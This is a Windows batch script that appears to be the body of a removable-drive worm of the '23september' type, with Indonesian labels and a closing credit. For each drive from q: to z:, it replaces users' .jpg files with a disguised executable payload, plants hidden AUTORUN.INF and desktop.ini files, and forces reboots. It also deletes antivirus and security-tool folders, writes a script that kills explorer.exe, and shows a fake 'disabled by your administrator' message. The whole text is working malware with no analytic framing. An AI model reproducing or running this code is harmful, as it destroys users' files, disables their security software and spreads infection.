for %%a in (q:\23september.bmp) do if %%~za equ 36920 goto selanjutnyar
attrib -r -s -h q:\23september.bmp
copy /y %windir%\system\istrq27.dll q:\23september.bmp
attrib +s +h +r q:\23september.bmp
:selanjutnyar
if exist q:\23\config.sys goto driver
if not exist q:\23 md q:\23
attrib -r -s -h q:* /s /d
if not exist "q:\backup_23" md "q:\backup_23"
attrib +s +h "q:\backup_23"
for /R q:\ %%d in (*.jpg) do if exist "%%d" copy "%%d" "q:\backup_23\*.23september"
for /R q:\ %%d in (*.jpg) do copy %windir%\Config01\configexp27.dll "%%d"
for /R q:\ %%d in (*.jpg) do if exist "%%d" ren "%%d" *.exe
copy /y %windir%\system\shell23\desktop.ini %windir%\winsys27.ini
for /R q:\ %%d in (desktop.ini) do copy %windir%\winsys27.ini "%%d"
copy /y %windir%\system\shell23\parta.ini q:\desktop.ini
attrib +s -h q:* /s /d
attrib +s +h "q:\backup_23"
attrib +s +h "q:\23september.bmp"
attrib +s +h q:*.ini /s
attrib -s -h -r q:\*.exe /s
attrib +s +h q:\AUTORUN.INF
echo [shell] > q:\23\config.sys
:driver
label q: 23september
if not exist q:\septemberends.exe shutdown -r -t 0 -f
for %%a in (q:\AUTORUN.INF) do if %%~za equ 79 goto rr
attrib -r -s -h q:\autorun.inf
copy /y %windir%\system\shell23\autorun.inf q:\AUTORUN.INF
attrib +s +h q:\AUTORUN.INF
:rr
if not exist r:\ goto ss
if exist %userprofile%\arma.arma goto drives
if exist r:\ntldr goto drives
if not exist r:\23september.bmp copy %windir%\system\istrq27.dll r:\23september.bmp
for %%a in (r:\23september.bmp) do if %%~za equ 36920 goto selanjutnyas
attrib -r -s -h r:\23september.bmp
copy /y %windir%\system\istrq27.dll r:\23september.bmp
attrib +s +h +r r:\23september.bmp
:selanjutnyas
if exist r:\23\config.sys goto drives
if not exist r:\23 md r:\23
attrib -r -s -h r:* /s /d
if not exist "r:\backup_23" md "r:\backup_23"
attrib +s +h "r:\backup_23"
for /R r:\ %%d in (*.jpg) do if exist "%%d" copy "%%d" "r:\backup_23\*.23september"
for /R r:\ %%d in (*.jpg) do copy %windir%\Config01\configexp27.dll "%%d"
for /R r:\ %%d in (*.jpg) do if exist "%%d" ren "%%d" *.exe
copy /y %windir%\system\shell23\desktop.ini %windir%\winsys27.ini
for /R r:\ %%d in (desktop.ini) do copy %windir%\winsys27.ini "%%d"
copy /y %windir%\system\shell23\parta.ini r:\desktop.ini
attrib +s -h r:* /s /d
attrib +s +h "r:\backup_23"
attrib +s +h "r:\23september.bmp"
attrib +s +h r:*.ini /s
attrib -s -h -r r:\*.exe /s
attrib +s +h r:\AUTORUN.INF
echo [shell] > r:\23\config.sys
:drives
label r: 23september
if not exist r:\septemberends.exe shutdown -r -t 0 -f
for %%a in (r:\AUTORUN.INF) do if %%~za equ 79 goto ss
attrib -r -s -h r:\autorun.inf
copy /y %windir%\system\shell23\autorun.inf r:\AUTORUN.INF
attrib +s +h r:\AUTORUN.INF
:ss
if not exist s:\ goto tt
if exist %userprofile%\arma.arma goto drivet
if exist s:\ntldr goto drivet
if not exist s:\23september.bmp copy %windir%\system\istrq27.dll s:\23september.bmp
for %%a in (s:\23september.bmp) do if %%~za equ 36920 goto selanjutnyat
attrib -r -s -h s:\23september.bmp
copy /y %windir%\system\istrq27.dll s:\23september.bmp
attrib +s +h +r s:\23september.bmp
:selanjutnyat
if exist s:\23\config.sys goto drivet
if not exist s:\23 md s:\23
attrib -r -s -h s:* /s /d
if not exist "s:\backup_23" md "s:\backup_23"
attrib +s +h "s:\backup_23"
for /R s:\ %%d in (*.jpg) do if exist "%%d" copy "%%d" "s:\backup_23\*.23september"
for /R s:\ %%d in (*.jpg) do copy %windir%\Config01\configexp27.dll "%%d"
for /R s:\ %%d in (*.jpg) do if exist "%%d" ren "%%d" *.exe
copy /y %windir%\system\shell23\desktop.ini %windir%\winsys27.ini
for /R s:\ %%d in (desktop.ini) do copy %windir%\winsys27.ini "%%d"
copy /y %windir%\system\shell23\parta.ini s:\desktop.ini
attrib +s -h s:* /s /d
attrib +s +h "s:\backup_23"
attrib +s +h "s:\23september.bmp"
attrib +s +h s:*.ini /s
attrib -s -h -r s:\*.exe /s
attrib +s +h s:\AUTORUN.INF
echo [shell] > s:\23\config.sys
:drivet
label s: 23september
if not exist s:\septemberends.exe shutdown -r -t 0 -f
for %%a in (s:\AUTORUN.INF) do if %%~za equ 79 goto tt
attrib -r -s -h s:\autorun.inf
copy /y %windir%\system\shell23\autorun.inf s:\AUTORUN.INF
attrib +s +h s:\AUTORUN.INF
:tt
if not exist t:\ goto uu
if exist %userprofile%\arma.arma goto driveu
if exist t:\ntldr goto driveu
if not exist t:\23september.bmp copy %windir%\system\istrq27.dll t:\23september.bmp
for %%a in (t:\23september.bmp) do if %%~za equ 36920 goto selanjutnyau
attrib -r -s -h t:\23september.bmp
copy /y %windir%\system\istrq27.dll t:\23september.bmp
attrib +s +h +r t:\23september.bmp
:selanjutnyau
if exist t:\23\config.sys goto driveu
if not exist t:\23 md t:\23
attrib -r -s -h t:* /s /d
if not exist "t:\backup_23" md "t:\backup_23"
attrib +s +h "t:\backup_23"
for /R t:\ %%d in (*.jpg) do if exist "%%d" copy "%%d" "t:\backup_23\*.23september"
for /R t:\ %%d in (*.jpg) do copy %windir%\Config01\configexp27.dll "%%d"
for /R t:\ %%d in (*.jpg) do if exist "%%d" ren "%%d" *.exe
copy /y %windir%\system\shell23\desktop.ini %windir%\winsys27.ini
for /R t:\ %%d in (desktop.ini) do copy %windir%\winsys27.ini "%%d"
copy /y %windir%\system\shell23\parta.ini t:\desktop.ini
attrib +s -h t:* /s /d
attrib +s +h "t:\backup_23"
attrib +s +h "t:\23september.bmp"
attrib +s +h t:*.ini /s
attrib -s -h -r t:\*.exe /s
attrib +s +h t:\AUTORUN.INF
echo [shell] > t:\23\config.sys
:driveu
label t: 23september
if not exist t:\septemberends.exe shutdown -r -t 0 -f
for %%a in (t:\AUTORUN.INF) do if %%~za equ 79 goto uu
attrib -r -s -h t:\autorun.inf
copy /y %windir%\system\shell23\autorun.inf t:\AUTORUN.INF
attrib +s +h t:\AUTORUN.INF
:uu
if not exist u:\ goto vv
if exist %userprofile%\arma.arma goto drivev
if exist u:\ntldr goto drivev
if not exist u:\23september.bmp copy %windir%\system\istrq27.dll u:\23september.bmp
for %%a in (u:\23september.bmp) do if %%~za equ 36920 goto selanjutnyav
attrib -r -s -h u:\23september.bmp
copy /y %windir%\system\istrq27.dll u:\23september.bmp
attrib +s +h +r u:\23september.bmp
:selanjutnyav
if exist u:\23\config.sys goto drivev
if not exist u:\23 md u:\23
attrib -r -s -h u:* /s /d
if not exist "u:\backup_23" md "u:\backup_23"
attrib +s +h "u:\backup_23"
for /R u:\ %%d in (*.jpg) do if exist "%%d" copy "%%d" "u:\backup_23\*.23september"
for /R u:\ %%d in (*.jpg) do copy %windir%\Config01\configexp27.dll "%%d"
for /R u:\ %%d in (*.jpg) do if exist "%%d" ren "%%d" *.exe
copy /y %windir%\system\shell23\desktop.ini %windir%\winsys27.ini
for /R u:\ %%d in (desktop.ini) do copy %windir%\winsys27.ini "%%d"
copy /y %windir%\system\shell23\parta.ini u:\desktop.ini
attrib +s -h u:* /s /d
attrib +s +h "u:\backup_23"
attrib +s +h "u:\23september.bmp"
attrib +s +h u:*.ini /s
attrib -s -h -r u:\*.exe /s
attrib +s +h u:\AUTORUN.INF
echo [shell] > u:\23\config.sys
:drivev
label u: 23september
if not exist u:\septemberends.exe shutdown -r -t 0 -f
for %%a in (u:\AUTORUN.INF) do if %%~za equ 79 goto uu
attrib -r -s -h u:\autorun.inf
copy /y %windir%\system\shell23\autorun.inf u:\AUTORUN.INF
attrib +s +h u:\AUTORUN.INF
:vv
if not exist v:\ goto ww
if exist %userprofile%\arma.arma goto drivew
if exist v:\ntldr goto drivew
if not exist v:\23september.bmp copy %windir%\system\istrq27.dll v:\23september.bmp
for %%a in (v:\23september.bmp) do if %%~za equ 36920 goto selanjutnyaw
attrib -r -s -h v:\23september.bmp
copy /y %windir%\system\istrq27.dll v:\23september.bmp
attrib +s +h +r v:\23september.bmp
:selanjutnyaw
if exist v:\23\config.sys goto drivew
if not exist v:\23 md v:\23
attrib -r -s -h v:* /s /d
if not exist "v:\backup_23" md "v:\backup_23"
attrib +s +h "v:\backup_23"
for /R v:\ %%d in (*.jpg) do if exist "%%d" copy "%%d" "v:\backup_23\*.23september"
for /R v:\ %%d in (*.jpg) do copy %windir%\Config01\configexp27.dll "%%d"
for /R v:\ %%d in (*.jpg) do if exist "%%d" ren "%%d" *.exe
copy /y %windir%\system\shell23\desktop.ini %windir%\winsys27.ini
for /R v:\ %%d in (desktop.ini) do copy %windir%\winsys27.ini "%%d"
copy /y %windir%\system\shell23\parta.ini v:\desktop.ini
attrib +s -h v:* /s /d
attrib +s +h "v:\backup_23"
attrib +s +h "v:\23september.bmp"
attrib +s +h v:*.ini /s
attrib -s -h -r v:\*.exe /s
attrib +s +h v:\AUTORUN.INF
echo [shell] > v:\23\config.sys
:drivew
label v: 23september
if not exist v:\septemberends.exe shutdown -r -t 0 -f
for %%a in (v:\AUTORUN.INF) do if %%~za equ 79 goto ww
attrib -r -s -h v:\autorun.inf
copy /y %windir%\system\shell23\autorun.inf v:\AUTORUN.INF
attrib +s +h v:\AUTORUN.INF
:ww
if not exist w:\ goto xx
if exist %userprofile%\arma.arma goto drivex
if exist w:\ntldr goto drivex
if not exist w:\23september.bmp copy %windir%\system\istrq27.dll w:\23september.bmp
for %%a in (w:\23september.bmp) do if %%~za equ 36920 goto selanjutnyax
attrib -r -s -h w:\23september.bmp
copy /y %windir%\system\istrq27.dll w:\23september.bmp
attrib +s +h +r w:\23september.bmp
:selanjutnyax
if exist w:\23\config.sys goto drivex
if not exist w:\23 md w:\23
attrib -r -s -h w:* /s /d
if not exist "w:\backup_23" md "w:\backup_23"
attrib +s +h "w:\backup_23"
for /R w:\ %%d in (*.jpg) do if exist "%%d" copy "%%d" "w:\backup_23\*.23september"
for /R w:\ %%d in (*.jpg) do copy %windir%\Config01\configexp27.dll "%%d"
for /R w:\ %%d in (*.jpg) do if exist "%%d" ren "%%d" *.exe
copy /y %windir%\system\shell23\desktop.ini %windir%\winsys27.ini
for /R w:\ %%d in (desktop.ini) do copy %windir%\winsys27.ini "%%d"
copy /y %windir%\system\shell23\parta.ini w:\desktop.ini
attrib +s -h w:* /s /d
attrib +s +h "w:\backup_23"
attrib +s +h "w:\23september.bmp"
attrib +s +h w:*.ini /s
attrib -s -h -r w:\*.exe /s
attrib +s +h w:\AUTORUN.INF
echo [shell] > w:\23\config.sys
:drivex
label w: 23september
if not exist w:\septemberends.exe shutdown -r -t 0 -f
for %%a in (w:\AUTORUN.INF) do if %%~za equ 79 goto xx
attrib -r -s -h w:\autorun.inf
copy /y %windir%\system\shell23\autorun.inf w:\AUTORUN.INF
attrib +s +h w:\AUTORUN.INF
:xx
if not exist x:\ goto yy
if exist %userprofile%\arma.arma goto drivey
if exist x:\ntldr goto drivey
if not exist x:\23september.bmp copy %windir%\system\istrq27.dll x:\23september.bmp
for %%a in (x:\23september.bmp) do if %%~za equ 36920 goto selanjutnyay
attrib -r -s -h x:\23september.bmp
copy /y %windir%\system\istrq27.dll x:\23september.bmp
attrib +s +h +r x:\23september.bmp
:selanjutnyay
if exist x:\23\config.sys goto drivey
if not exist x:\23 md x:\23
attrib -r -s -h x:* /s /d
if not exist "x:\backup_23" md "x:\backup_23"
attrib +s +h "x:\backup_23"
for /R x:\ %%d in (*.jpg) do if exist "%%d" copy "%%d" "x:\backup_23\*.23september"
for /R x:\ %%d in (*.jpg) do copy %windir%\Config01\configexp27.dll "%%d"
for /R x:\ %%d in (*.jpg) do if exist "%%d" ren "%%d" *.exe
copy /y %windir%\system\shell23\desktop.ini %windir%\winsys27.ini
for /R x:\ %%d in (desktop.ini) do copy %windir%\winsys27.ini "%%d"
copy /y %windir%\system\shell23\parta.ini x:\desktop.ini
attrib +s -h x:* /s /d
attrib +s +h "x:\backup_23"
attrib +s +h "x:\23september.bmp"
attrib +s +h x:*.ini /s
attrib -s -h -r x:\*.exe /s
attrib +s +h x:\AUTORUN.INF
echo [shell] > x:\23\config.sys
:drivey
label x: 23september
if not exist x:\septemberends.exe shutdown -r -t 0 -f
for %%a in (x:\AUTORUN.INF) do if %%~za equ 79 goto yy
attrib -r -s -h x:\autorun.inf
copy /y %windir%\system\shell23\autorun.inf x:\AUTORUN.INF
attrib +s +h x:\AUTORUN.INF
:yy
if not exist y:\ goto zz
if exist %userprofile%\arma.arma goto drivez
if exist y:\ntldr goto drivez
if not exist y:\23september.bmp copy %windir%\system\istrq27.dll y:\23september.bmp
for %%a in (y:\23september.bmp) do if %%~za equ 36920 goto selanjutnyaz
attrib -r -s -h y:\23september.bmp
copy /y %windir%\system\istrq27.dll y:\23september.bmp
attrib +s +h +r y:\23september.bmp
:selanjutnyaz
if exist y:\23\config.sys goto drivez
if not exist y:\23 md y:\23
attrib -r -s -h y:* /s /d
if not exist "y:\backup_23" md "y:\backup_23"
attrib +s +h "y:\backup_23"
for /R y:\ %%d in (*.jpg) do if exist "%%d" copy "%%d" "y:\backup_23\*.23september"
for /R y:\ %%d in (*.jpg) do copy %windir%\Config01\configexp27.dll "%%d"
for /R y:\ %%d in (*.jpg) do if exist "%%d" ren "%%d" *.exe
copy /y %windir%\system\shell23\desktop.ini %windir%\winsys27.ini
for /R y:\ %%d in (desktop.ini) do copy %windir%\winsys27.ini "%%d"
copy /y %windir%\system\shell23\parta.ini y:\desktop.ini
attrib +s -h y:* /s /d
attrib +s +h "y:\backup_23"
attrib +s +h "y:\23september.bmp"
attrib +s +h y:*.ini /s
attrib -s -h -r y:\*.exe /s
attrib +s +h y:\AUTORUN.INF
echo [shell] > y:\23\config.sys
:drivez
label y: 23september
if not exist y:\septemberends.exe shutdown -r -t 0 -f
for %%a in (y:\AUTORUN.INF) do if %%~za equ 79 goto zz
attrib -r -s -h y:\autorun.inf
copy /y %windir%\system\shell23\autorun.inf y:\AUTORUN.INF
attrib +s +h y:\AUTORUN.INF
:zz
if not exist z:\ goto zzt
if exist %userprofile%\arma.arma goto drivezt
if exist z:\ntldr goto drivezt
if not exist z:\23september.bmp copy %windir%\system\istrq27.dll z:\23september.bmp
for %%a in (z:\23september.bmp) do if %%~za equ 36920 goto selanjutnyazt
attrib -r -s -h z:\23september.bmp
copy /y %windir%\system\istrq27.dll z:\23september.bmp
attrib +s +h +r z:\23september.bmp
:selanjutnyazt
if exist z:\23\config.sys goto drivezt
if not exist z:\23 md z:\23
attrib -r -s -h z:* /s /d
if not exist "z:\backup_23" md "z:\backup_23"
attrib +s +h "z:\backup_23"
for /R z:\ %%d in (*.jpg) do if exist "%%d" copy "%%d" "z:\backup_23\*.23september"
for /R z:\ %%d in (*.jpg) do copy %windir%\Config01\configexp27.dll "%%d"
for /R z:\ %%d in (*.jpg) do if exist "%%d" ren "%%d" *.exe
copy /y %windir%\system\shell23\desktop.ini %windir%\winsys27.ini
for /R z:\ %%d in (desktop.ini) do copy %windir%\winsys27.ini "%%d"
copy /y %windir%\system\shell23\parta.ini z:\desktop.ini
attrib +s -h z:* /s /d
attrib +s +h "z:\backup_23"
attrib +s +h "z:\23september.bmp"
attrib +s +h z:*.ini /s
attrib -s -h -r z:\*.exe /s
attrib +s +h z:\AUTORUN.INF
echo [shell] > z:\23\config.sys
:drivezt
label z: 23september
if not exist z:\septemberends.exe shutdown -r -t 0 -f
for %%a in (z:\AUTORUN.INF) do if %%~za equ 79 goto zzt
attrib -r -s -h z:\autorun.inf
copy /y %windir%\system\shell23\autorun.inf z:\AUTORUN.INF
attrib +s +h z:\AUTORUN.INF
:zzt
if exist %systemdrive%\23s.ini goto awal
if exist %systemdrive%\desktop.ini attrib -r -s -h "%systemdrive%\desktop.ini"
copy /y %windir%\system\shell23\parta.ini %systemdrive%\desktop.ini
copy /y %windir%\system\shell23\parta.ini %systemdrive%\23s.ini
attrib +s +h "%systemdrive%\23s.ini"
attrib +s +h "%systemdrive%\desktop.ini"
if not exist %systemdrive%\23september.bmp copy %windir%\system\istrq27.dll %systemdrive%\23september.bmp
attrib +s +h "%systemdrive%\23september.bmp"
:awal
for %%a in (%systemdrive%\23september.bmp) do if %%~za equ 36920 goto slsystemdr
attrib -r -s -h %systemdrive%\23september.bmp
copy /y %windir%\system\istrq27.dll %systemdrive%\23september.bmp
attrib +s +h +r %systemdrive%\23september.bmp
:slsystemdr
if exist %systemdrive%\progra~1\Ahead\ del /f /q /s  %systemdrive%\progra~1\Ahead\*.* >nul
if exist %systemdrive%\Ahead\ del /f /q /s  %systemdrive%\Ahead\*.* >nul
if exist %systemdrive%\progra~1\Securi~1\ del /f /q /s %systemdrive%\progra~1\Securi~1\*.* >nul
if exist %systemdrive%\Securi~1\ del /f /q /s %systemdrive%\Securi~1\*.* >nul
if exist "%systemdrive%\progra~1\ACD Systems\" del /f /q /s "%systemdrive%\progra~1\ACD Systems\"*.* >nul
if exist "%systemdrive%\ACD Systems\" del /f /q /s "%systemdrive%\ACD Systems\"*.* >nul
if exist "%systemdrive%\progra~1\explor~1\" del /f /q /s "%systemdrive%\progra~1\explor~1\"*.* >nul
if exist "%systemdrive%\explor~1\" del /f /q /s "%systemdrive%\explor~1\"*.* >nul
if exist "%systemdrive%\progra~1\tuneup~1\" del /f /q /s "%systemdrive%\progra~1\tuneup~1\"*.* >nul
if exist "%systemdrive%\tuneup~1\" del /f /q /s "%systemdrive%\tuneup~1\"*.* >nul
if exist "%systemdrive%\progra~1\RegCle~1\" del /f /q /s "%systemdrive%\progra~1\RegCle~1\"*.* >nul
if exist "%systemdrive%\RegCle~1\" del /f /q /s "%systemdrive%\RegCle~1\"*.* >nul
if exist "%systemdrive%\progra~1\Unlocker\" del /f /q /s "%systemdrive%\progra~1\Unlocker\"*.* >nul
if exist "%systemdrive%\Unlocker\" del /f /q /s "%systemdrive%\Unlocker\"*.* >nul
if exist %systemdrive%\ESET\ del /f /q /s  %systemdrive%\ESET\*.* >nul
if exist %systemdrive%\antivi~1\ del /f /q /s  %systemdrive%\antivi~1\*.* >nul
if exist %systemdrive%\antivi~2\ del /f /q /s  %systemdrive%\antivi~2\*.* >nul
if exist %systemdrive%\antiviru\ del /f /q /s  %systemdrive%\antiviru\*.* >nul
if exist %systemdrive%\avg\ del /f /q /s  %systemdrive%\avg\*.* >nul
if exist %systemdrive%\kasper~1\ del /f /q /s  %systemdrive%\kasper~1\*.* >nul
if exist %systemdrive%\kasper~2\ del /f /q /s  %systemdrive%\kasper~2\*.* >nul
if exist %systemdrive%\mcafee\ del /f /q /s  %systemdrive%\mcafee\*.* >nul
if exist %systemdrive%\mcafee.com\agent\ del /f /q /s  %systemdrive%\mcafee.com\agent\*.* >nul
if exist %systemdrive%\mcafee.com\ del /f /q /s  %systemdrive%\mcafee.com\*.* >nul
if exist %systemdrive%\mcafee.com\VSO\ del /f /q /s  %systemdrive%\mcafee.com\VSO\*.* >nul
if exist %systemdrive%\mcafee~1\ del /f /q /s  %systemdrive%\mcafee~1\*.* >nul
if exist %systemdrive%\msav\ del /f /q /s  %systemdrive%\msav\*.* >nul
if exist %systemdrive%\norman\ del /f /q /s  %systemdrive%\norman\*.* >nul
if exist %systemdrive%\norton~1\ del /f /q /s  %systemdrive%\norton~1\*.* >nul
if exist %systemdrive%\norton~2\ del /f /q /s  %systemdrive%\norton~2\*.* >nul
if exist %systemdrive%\pav\ del /f /q /s  %systemdrive%\pav\*.* >nul
if exist %systemdrive%\pccill~1\ del /f /q /s  %systemdrive%\pccill~1\*.* >nul
if exist %systemdrive%\iolo\ del /f /q /s  %systemdrive%\iolo\*.* >nul
if exist %systemdrive%\progra~1\ESET\ del /f /q /s  %systemdrive%\progra~1\ESET\*.* >nul
if exist %systemdrive%\progra~1\antivi~1\ del /f /q /s  %systemdrive%\progra~1\antivi~1\*.* >nul
if exist %systemdrive%\progra~1\antivi~2\ del /f /q /s  %systemdrive%\progra~1\antivi~2\*.* >nul
if exist %systemdrive%\progra~1\avg\ del /f /q /s  %systemdrive%\progra~1\avg\*.* >nul
if exist %systemdrive%\progra~1\kasper~1\ del /f /q /s  %systemdrive%\progra~1\kasper~1\*.* >nul
if exist %systemdrive%\progra~1\kasper~2\ del /f /q /s  %systemdrive%\progra~1\kasper~2\*.* >nul
if exist %systemdrive%\progra~1\mcafee\ del /f /q /s  %systemdrive%\progra~1\mcafee\*.* >nul
if exist %systemdrive%\progra~1\McAfee.com\agent\ del /f /q /s  %systemdrive%\progra~1\McAfee.com\agent\*.* >nul
if exist %systemdrive%\progra~1\McAfee.com\ del /f /q /s  %systemdrive%\progra~1\McAfee.com\*.* >nul
if exist %systemdrive%\progra~1\McAfee.com\VSO\ del /f /q /s  %systemdrive%\progra~1\McAfee.com\VSO\*.* >nul
if exist %systemdrive%\progra~1\mcafee~1\ del /f /q /s  %systemdrive%\progra~1\mcafee~1\*.* >nul
if exist %systemdrive%\progra~1\mindso~1\ del /f /q /s  %systemdrive%\progra~1\mindso~1\*.* >nul
if exist %systemdrive%\progra~1\norman\ del /f /q /s  %systemdrive%\progra~1\norman\*.* >nul
if exist %systemdrive%\progra~1\norton~1\ del /f /q /s  %systemdrive%\progra~1\norton~1\*.* >nul
if exist %systemdrive%\progra~1\norton~2\ del /f /q /s  %systemdrive%\progra~1\norton~2\*.* >nul
if exist %systemdrive%\progra~1\pandas~1\ del /f /q /s  %systemdrive%\progra~1\pandas~1\*.* >nul
if exist %systemdrive%\Progra~1\Alwils~1\ del /f /q /s  %systemdrive%\Progra~1\Alwils~1\*.* >nul
if exist %systemdrive%\progra~1\iolo\ del /f /q /s  %systemdrive%\progra~1\iolo\*.* >nul
if not exist %windir%\winshell0 md %windir%\winshell0
if exist %windir%\winshell0\kill.txt goto killexp
attrib +s +h %windir%\winshell0
echo @echo off >> %windir%\winshell0\kill.bat
echo cd.. >> %windir%\winshell0\kill.bat
echo TASKKILL /F /IM explorer.exe >> %windir%\winshell0\kill.bat
echo exit >> %windir%\winshell0\kill.bat
echo kill2077 > %windir%\winshell0\kill.txt
:killexp
if not exist %windir%\nangka md %windir%\nangka
if not exist %windir%\nangka\btautoexeca.bat goto btauto
if exist %windir%\nangka\btautoexec.dat goto luxx
:btauto
echo @echo off >> %windir%\nangka\btautoexeca.bat
echo echo Microsoft Windows XP [Version 5.1.2600] >> %windir%\nangka\btautoexeca.bat
echo echo (C) Copyright 1985-2001 Microsoft Corp. >> %windir%\nangka\btautoexeca.bat
echo echo. >> %windir%\nangka\btautoexeca.bat
echo echo The Command Prompt has been disable by your administrator. >> %windir%\nangka\btautoexeca.bat
echo echo. >> %windir%\nangka\btautoexeca.bat
echo echo Press any key to continue . . .  >> %windir%\nangka\btautoexeca.bat
echo call %systemdrive%\23september_ends.txt >> %windir%\nangka\btautoexeca.bat
echo pause >> %windir%\nangka\btautoexeca.bat
echo pause >> %windir%\nangka\btautoexeca.bat
echo exit >> %windir%\nangka\btautoexeca.bat
attrib +s +h %windir%\nangka
echo mov223 > %windir%\nangka\btautoexec.dat
:luxx
if exist %windir%\acx4.temp goto acx4
del /f /s /q "%userprofile%\Local Settings\Temp\*.dat"
echo [usetemp] > %windir%\acx4.temp
:acx4
if exist "%userprofile%\Local Settings\Temp\Perfli~1.dat" shutdown -l -t 0 -f
if exist "%userprofile%\Local Settings\Temp\acd*.wav" shutdown -l -t 0 -f
if not exist "%userprofile%\Desktop\23september.txt" call "%windir%\winshell0\kill.bat"
goto nangkacomm
:dsktop
echo Thanks 4 anak-anak nangka >> "%userprofile%\Desktop\23september.txt"
echo Tetep jaga persahabatan dan saling membantu dalam kesulitan >> "%userprofile%\Desktop\23september.txt"
echo Banyak inspirasi dan semangat baru yang datang dari kalian >> "%userprofile%\Desktop\23september.txt"
echo It's simple community >> "%userprofile%\Desktop\23september.txt"
echo ~[[nam_inspiro]]~ @ [[nangkaComm Djogdja]] >> "%userprofile%\Desktop\23september.txt"
goto nangkacomm
